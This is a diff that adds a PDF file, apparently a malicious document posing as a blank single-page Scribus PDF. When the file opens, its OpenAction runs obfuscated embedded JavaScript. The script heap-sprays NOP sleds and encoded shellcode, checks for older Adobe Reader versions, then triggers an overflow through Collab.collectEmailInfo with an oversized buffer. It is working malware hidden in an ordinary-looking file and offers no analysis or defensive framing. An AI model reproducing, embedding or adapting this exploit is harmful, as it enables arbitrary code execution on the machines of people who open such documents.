@@ -1,0 +1,150 @@
+%PDF-1.3
+%‚„œ”
+1 0 obj
+<</OpenAction <</JS (this.DC1woPeIjaf\(\))
+/S /JavaScript
+>>
+/Threads 2 0 R
+/Outlines 3 0 R
+/Pages 4 0 R
+/ViewerPreferences <</PageDirection /L2R
+>>
+/PageLayout /SinglePage
+/AcroForm 5 0 R
+/Dests 6 0 R
+/Names 7 0 R
+/Type /Catalog
+>>
+endobj
+3 0 obj
+<</Count 0
+/Type /Outlines
+>>
+endobj
+4 0 obj
+<</Resources 8 0 R
+/Kids [9 0 R]
+/Count 1
+/Type /Pages
+>>
+endobj
+6 0 obj
+<<>>
+endobj
+5 0 obj
+<</Fields []
+>>
+endobj
+7 0 obj
+<</JavaScript 10 0 R
+>>
+endobj
+2 0 obj
+[]
+endobj
+11 0 obj
+<</Length 31
+>>
+stream
+0 0 595.28000 841.89000 re W n
+
+endstream
+endobj
+9 0 obj
+<</Rotate 0
+/Parent 4 0 R
+/Resources 8 0 R
+/TrimBox [0 0 595.28000 841.89000]
+/MediaBox [0 0 595.28000 841.89000]
+/pdftk_PageNum 1
+/Contents 11 0 R
+/Type /Page
+>>
+endobj
+8 0 obj
+<</ProcSet [/PDF /Text /ImageB /ImageC /ImageI]
+>>
+endobj
+12 0 obj
+<</Length 5592
+>>
+stream
+function DC1woPeIjaf(){var e6AAdPjLW = new Array();
+function ijXh(luUWymDtz6, IlTkLE){while (luUWymDtz6.length*2<IlTkLE) {luUWymDtz6 += luUWymDtz6;}luUWymDtz6 = luUWymDtz6.substring(0,IlTkLE/2);return luUWymDtz6;}
+function froF9X1jh4CYv(){var Y6DH = 0x0c0c0c0c;
+	var eNQKxP = unescape("%uDC"+""+"DA%u93"+"B"+"8%u5"+"9BF%uD9E"+"5%u247"+"4%u33"+"F4%u5AC9%u5E"+""+"B1" +
+                         "%uC2"+"8"+"3%u31"+"04%u1342%uD1"+"03%uBBAC%u3E"+"10%u61C2%uF391" +
+                         "%uF32A%uCF9C%u7CAD%u25EA%u9E37%uD2E9%uB742%uDB"+"E5" +
+                         "%uB8B2%u6F8A%uDED4%uACF2%uD"+"81B%uA"+"BAD%u807D%u12BC" +
+                         "%uA1E8%u212"+"9%uD427%uB870%u995A%u5090%u0BFF%u2378" +
+                         "%uB"+"6E1%u39E8%u7F05%u5F76%u57DB%u350A%u9"+"8AF%u81DB" +
+                         "%u8142%u737E%uA671%uE48D%u5"+"2B5%uE74D%u63A7%uED77" +
+                         "%uFE9"+"9%u6AA4%uC156%u4B93%u9584%u8C09%u8F14%u7A74" +
+                         "%u2A1F%uD0D0%uB58F%uB5F3%u9522%u2F71%u7"+"118%uD402" +
+                         "%uD"+"907%u73E0%u80AD%uE016%u5AC0%uB90D%uB073%uB678" +
+                         "%u75E1%uF10B%uEF83%u1"+"B75%u9BEB%uD44D%u6A75%u2934" +
+                         "%u336B%u35"+"44%uC24C%uDC0E%uBCD4%u8155%u716C%u24B6" +
+                         "%u97D6%u35A5%u0701%u7E2C%u222B%u92F6%u3F09%u58B1" +
+                         "%u71F7%u02"+"B7%u1765%u4"+"2FD%uD422%u"+"6FA0%uB8D7%u73BC" +
+                         "%u5B7"+"1%uD294%u954B%u2B23%u4082%uD67A%uC807%uD24B" +
+                         "%u1"+"C4E%u2B22%u6EE8%u01D8%u5BAC%u0C3F%uC4A3%u65F7" +
+                         "%uCF"+"F4%u326E%u10C8%uBF5C%u3A"+"B9%u65F8%u8437%uFF9D" +
+                         "%u24D"+"1%u129D%u32D4%u16A8%u393F%u0DA8%u283C%u48B9" +
+                         "%u5163%uA0D3%u407C%uC8C1%u4889%uDBEA%u898E%uEDE6" +
+                         "%u8"+"E84%u8821%uBF95%u7625%uBCC8%u1F30%uDCD7%uF235" +
+                         "%uEF"+"25%uF05D%uED4E%uDD"+"3B%uF659%u08C1%uFC55%u4AD1" +
+                         "%uE"+"37D%u33FE%u0F6E%uB70B%u2799%uFB"+"6D%u1DAD%uF553" +
+                         "%u69DC%u0F99%u6BD8%u19AF%u64C6%u19"+"C5%u1D21%u954E" +
+                         "%u6E"+"A6%u7AB5%uB868%uAAF1%uF34"+"7%u9C38%uCC9E%uD114" +
+                         "%u03D4%u69"+"46%u1276%uE6B7%uAE"+"0D%u88E"+"9%u3E85%u0"+"076");
+	var mcWiHe3fq = 0x400000;var jQ1MtQni = eNQKxP.length * 2;var IlTkLE = mcWiHe3fq - (jQ1MtQni+0x38);var luUWymDtz6 = unescape("%u9"+"090%u9"+"090");luUWymDtz6 = ijXh(luUWymDtz6, IlTkLE);var h9dsS7JMG = (Y6DH - 0x400000)/mcWiHe3fq;for (var tOhk3nycp3o=0;tOhk3nycp3o<h9dsS7JMG;tOhk3nycp3o++) {e6AAdPjLW[tOhk3nycp3o] = luUWymDtz6 + eNQKxP;}}
+function lZkGHsR7IuG(){var K7b72pw85iOXw = app.viewerVersion.toString();K7b72pw85iOXw = K7b72pw85iOXw.replace(/\D/g,'');var wttl = new Array(K7b72pw85iOXw.charAt(0),K7b72pw85iOXw.charAt(1),K7b72pw85iOXw.charAt(2));if ((wttl[0] == 8 && ((wttl[1] == 1 && wttl[2] < 2) || wttl[1] < 1)) ||(wttl[0] == 7 && wttl[1] < 1) ||(wttl[0] < 7)) {froF9X1jh4CYv();var H0wJb9EOw = unescape("%u0c0c%u0c0c");while(H0wJb9EOw.length < 44952) H0wJb9EOw += H0wJb9EOw;this.collabStore = Collab.collectEmailInfo({subj: "",msg: H0wJb9EOw});}}
+lZkGHsR7IuG();
+}
+endstream
+endobj
+13 0 obj
+<</JS 12 0 R
+/S /JavaScript
+>>
+endobj
+10 0 obj
+<</Names [(DC1woPeIjaf) 13 0 R]
+>>
+endobj
+14 0 obj
+<</Creator (Scribus 1.3.3.12)
+/Title <>
+/Producer (Scribus PDF Library 1.3.3.12)
+/Author <>
+/Keywords <>
+/Trapped /False
+/ModDate (D:20080806014227)
+/CreationDate (D:20080806014227)
+>>
+endobj
+xref
+0 15
+0000000000 65535 f 
+0000000015 00000 n 
+0000000470 00000 n 
+0000000262 00000 n 
+0000000307 00000 n 
+0000000400 00000 n 
+0000000380 00000 n 
+0000000431 00000 n 
+0000000747 00000 n 
+0000000569 00000 n 
+0000006504 00000 n 
+0000000488 00000 n 
+0000000813 00000 n 
+0000006457 00000 n 
+0000006554 00000 n 
+trailer
+<</Info 14 0 R
+/Root 1 0 R
+/Size 15
+>>
+startxref
+6755
+%%EOF
